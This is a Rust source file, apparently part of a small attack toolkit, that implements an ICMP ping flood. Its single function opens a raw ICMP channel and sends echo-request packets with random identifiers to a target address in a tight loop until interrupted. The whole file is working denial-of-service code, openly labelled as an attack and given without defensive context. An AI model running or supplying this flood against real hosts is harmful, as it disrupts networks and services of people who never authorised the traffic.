// Copyright (C) 2020 Cody Lewis
//
// This program is free software: you can redistribute it and/or modify
// it under the terms of the GNU General Public License as published by
// the Free Software Foundation, either version 3 of the License, or
// (at your option) any later version.
//
// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.
//
// You should have received a copy of the GNU General Public License
// along with this program.  If not, see <https://www.gnu.org/licenses/>.


extern crate rand;
extern crate pnet;
extern crate ctrlc;

use std::net::IpAddr;
use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::Arc;

use rand::random;

use pnet::packet::util;
use pnet::packet::ip::IpNextHeaderProtocols;
use pnet::packet::icmp::{echo_request, IcmpTypes};
use pnet::transport::TransportChannelType::Layer4;
use pnet::transport::TransportProtocol::Ipv4;
use pnet::transport::transport_channel;
use pnet::packet::Packet;

/// Run the icmp ping flood attack
pub fn run(address: &String) {
    let protocol = Layer4(Ipv4(IpNextHeaderProtocols::Icmp));
    let (mut tx, _) = match transport_channel(4096, protocol) {
        Ok((tx, rx)) => (tx, rx),
        Err(e) => panic!("Error creating the transport channel: {}", e),
    };
    let addr = match address.as_str().parse::<IpAddr>() {
        Ok(s) => s,
        Err(e) => panic!("Failed to parse address: {}", e),
    };

    let running = Arc::new(AtomicBool::new(true));
    let r = running.clone();
    ctrlc::set_handler(move || {
        r.store(false, Ordering::SeqCst);
    }).expect("Error setting CTRL+C handler");

    while running.load(Ordering::SeqCst) {
        let mut vec: Vec<u8> = vec![0; 64];
        let mut packet = echo_request::MutableEchoRequestPacket::new(&mut vec[..]).unwrap();
        packet.set_icmp_type(IcmpTypes::EchoRequest);
        packet.set_sequence_number(random::<u16>());
        packet.set_identifier(random::<u16>());
        let csum = util::checksum(packet.packet(), 1);
        packet.set_checksum(csum);
        match tx.send_to(packet, addr) {
            Ok(_) => print!("."),
            Err(_) => print!("_"),
        }
    }
}
